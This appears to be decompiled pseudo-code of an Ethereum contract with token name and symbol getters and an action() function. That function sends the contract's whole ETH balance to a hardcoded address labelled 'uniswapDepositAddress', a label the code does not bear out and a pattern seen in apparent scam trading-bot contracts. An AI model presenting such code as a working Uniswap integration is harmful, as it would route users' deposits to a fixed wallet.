contract main {




// =====================  Runtime code  =====================


const uniswapDepositAddress = 0x442b4a319c7a15d9f9b09477f019621ca4131db4


array of uint256 tokenName;
array of uint256 tokenSymbol;

function tokenName() {
    return tokenName[0 len tokenName.length]
}

function tokenSymbol() {
    return tokenSymbol[0 len tokenSymbol.length]
}

function _fallback() payable {
    revert
}

function action() payable {
    call 0x442b4a319c7a15d9f9b09477f019621ca4131db4 with:
       value eth.balance(this.address) wei
         gas 2300 * is_zero(value) wei
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
}



}
